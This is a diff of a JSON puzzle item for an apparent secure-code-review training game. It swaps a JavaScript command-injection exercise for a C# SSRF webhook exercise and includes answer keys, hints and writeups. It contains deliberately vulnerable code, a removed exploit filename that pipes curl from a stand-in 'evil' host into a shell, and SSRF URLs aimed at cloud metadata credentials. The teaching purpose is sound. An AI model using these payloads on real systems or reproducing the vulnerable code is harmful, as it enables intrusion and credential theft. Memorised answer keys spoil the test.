@@ -1,53 +1,55 @@
 {
-  "id": "srd-0020",
+  "id": "srd-0023",
   "date": "2026-10-16",
   "difficulty": "medium",
-  "language": "javascript",
+  "language": "csharp",
   "estimatedMinutes": 15,
   "snippet": {
     "files": [
       {
-        "name": "thumbnail.js",
-        "code": "const { exec } = require(\"child_process\");\n\nfunction makeThumbnail(file, cb) {\n  // Resize an uploaded image using ImageMagick.\n  const out = file + \".thumb.png\";\n  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n  exec(cmd, cb);\n}\n\nmodule.exports = makeThumbnail;",
+        "name": "WebhookService.cs",
+        "code": "using System.Net.Http;\nusing System.Threading.Tasks;\n\npublic class WebhookService\n{\n    private static readonly HttpClient Http = new HttpClient();\n\n    // Deliver an event to the customer's configured webhook URL.\n    public async Task<string> Deliver(string webhookUrl, string json)\n    {\n        var content = new StringContent(json);\n        var resp = await Http.PostAsync(webhookUrl, content);\n        return await resp.Content.ReadAsStringAsync();\n    }\n}",
         "notes": {
-          "3": "Called with the path of an uploaded image (the filename is attacker-influenced).",
-          "5": "Derives the output thumbnail path.",
-          "6": "Builds the shell command string with `file` concatenated in.",
-          "7": "`exec` runs that command string through /bin/sh."
+          "6": "A shared HttpClient instance (reuse is the recommended pattern).",
+          "9": "`webhookUrl` is configured by the customer — attacker-controlled.",
+          "11": "Wraps the event JSON as the request body.",
+          "12": "The server POSTs to that URL.",
+          "13": "Returns the response body to the caller."
         }
       }
     ]
   },
   "stages": {
     "line": {
-      "file": "thumbnail.js",
-      "line": 7,
+      "file": "WebhookService.cs",
+      "line": 12,
       "yellowRadius": 2,
       "maxGuesses": 5
     },
     "bugClass": {
-      "answer": "command-inj",
+      "answer": "ssrf",
       "options": [
-        "command-inj",
-        "code-inj",
-        "path-traversal",
         "ssrf",
-        "sqli"
+        "open-redirect",
+        "idor",
+        "xxe",
+        "insecure-deser",
+        "missing-authz"
       ]
     },
     "why": {
       "answerIndex": 2,
       "options": [
         {
-          "label": "`convert` is CPU-heavy, so repeated calls exhaust the server",
-          "whyWrong": "Resource cost isn't the vulnerability; the shell interpreting the filename is."
+          "label": "A static HttpClient leaks sockets and should be disposed per call",
+          "whyWrong": "Reusing HttpClient is actually correct; this isn't the security issue."
         },
         {
-          "label": "The thumbnail path is predictable, letting attackers find it",
-          "whyWrong": "Predictable output names are minor next to command execution."
+          "label": "StringContent defaults to text/plain, which some servers reject",
+          "whyWrong": "A content-type nit has nothing to do with the vulnerability."
         },
         {
-          "label": "`exec` runs the string in a shell and `file` (an attacker-influenced upload name) is concatenated in, so shell metacharacters execute"
+          "label": "`webhookUrl` is user-configured and the request is made by the server, so it can reach internal-only endpoints; returning the body leaks their contents"
         }
       ]
     },
@@ -55,23 +57,23 @@
       "answerIndex": 1,
       "options": [
         {
-          "label": "Wrap file in single quotes inside the command",
-          "diff": "-  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n+  const cmd = \"convert '\" + file + \"' -resize 200x200 '\" + out + \"'\";",
-          "whyWrong": "A single quote in the filename closes the quote and resumes command context."
+          "label": "Require the URL to use https",
+          "diff": "+        if (!webhookUrl.StartsWith(\"https://\")) throw new ArgumentException();",
+          "whyWrong": "`https://169.254.169.254` or an internal HTTPS service is still reachable; scheme isn't the control."
         },
         {
-          "label": "Use execFile('convert', [file, '-resize', '200x200', out]) so no shell parses the arguments",
-          "diff": "-  const { exec } = require(\"child_process\");\n+  const { execFile } = require(\"child_process\");\n-  const cmd = \"convert \" + file + \" -resize 200x200 \" + out;\n-  exec(cmd, cb);\n+  execFile(\"convert\", [file, \"-resize\", \"200x200\", out], cb);"
+          "label": "Allow only http/https, resolve the host, and reject private/loopback/link-local addresses (re-checking on redirects)",
+          "diff": "-        var resp = await Http.PostAsync(webhookUrl, content);\n+        await EnsurePublicDestination(webhookUrl); // resolves host, blocks RFC1918/loopback/link-local\n+        var resp = await noRedirectClient.PostAsync(webhookUrl, content);"
         },
         {
-          "label": "Strip spaces from file",
-          "diff": "+  file = file.replace(/ /g, \"\");",
-          "whyWrong": "Metacharacters like `;`, `|`, `&&`, `$()` and backticks need no spaces."
+          "label": "Add a request timeout",
+          "diff": "+        Http.Timeout = TimeSpan.FromSeconds(5);",
+          "whyWrong": "A timeout limits how long the request runs, not where it goes."
         },
         {
-          "label": "Reject filenames not ending in a known image extension",
-          "diff": "+  if (!/\\.(png|jpg)$/.test(file)) throw new Error(\"bad file\");",
-          "whyWrong": "`x.jpg;id #.png` passes a suffix check and still injects; the shell is still involved."
+          "label": "Reject URLs containing 'internal' or 'localhost'",
+          "diff": "+        if (webhookUrl.Contains(\"localhost\") || webhookUrl.Contains(\"internal\")) throw new ArgumentException();",
+          "whyWrong": "IP literals and other hostnames bypass the substring check."
         }
       ]
     }
@@ -82,28 +84,24 @@
     "attribution": "SourceReadle original"
   },
   "training": {
-    "exploit": "Upload a file whose name is `x.jpg; curl http://evil/s | sh #`. When the thumbnailer runs, the shell executes `convert x.jpg ...` and then the injected command. Upload filenames are attacker-controlled, so no other input is needed.",
+    "exploit": "A customer sets their webhook URL to `http://169.254.169.254/latest/meta-data/iam/security-credentials/` (cloud metadata) or `http://127.0.0.1:8500/v1/kv/?recurse` (internal Consul). The server dutifully requests it and returns the response body — handing the attacker internal data or credentials.",
     "concepts": [
-      "CWE-78",
-      "OWASP A03:2021"
+      "CWE-918",
+      "OWASP A10:2021"
     ],
     "hints": {
-      "line": "Which call hands a built string to a shell?",
-      "bugClass": "The filename reaches the OS shell.",
-      "why": "What parses `file` on line 7 — the program, or /bin/sh?",
-      "fix": "Pass arguments as an array with no shell."
+      "line": "Where does the server fetch a URL it was handed?",
+      "bugClass": "The server reaches a destination the user chose.",
+      "why": "What internal hosts can the server reach that the customer can't?",
+      "fix": "Validate the resolved destination is a public address you intend."
     }
   },
   "writeup": {
-    "summary": "`exec` runs its argument through `/bin/sh`, and `file` — an attacker-influenced upload name — is concatenated into that string, so shell metacharacters in the name execute commands. `execFile('convert', [file, ...])` spawns the binary directly with `file` as one argument; there is no shell to interpret `;`, `|`, `$()`, or backticks. Quoting and suffix checks are bypassable.",
+    "summary": "`Deliver` POSTs to any URL the customer configured and returns the response, from the server's privileged network position — textbook SSRF. An attacker points the webhook at cloud metadata or internal services to exfiltrate credentials and data. The fix validates the scheme, resolves the host, and rejects private/loopback/link-local ranges (re-checking after any redirect), rather than blocklisting hostnames or relying on https.",
     "readNext": [
       {
-        "label": "Node child_process: exec vs execFile",
-        "url": "https://nodejs.org/api/child_process.html"
-      },
-      {
-        "label": "OWASP Command Injection",
-        "url": "https://owasp.org/www-community/attacks/Command_Injection"
+        "label": "OWASP SSRF Prevention Cheat Sheet",
+        "url": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"
       }
     ]
   }
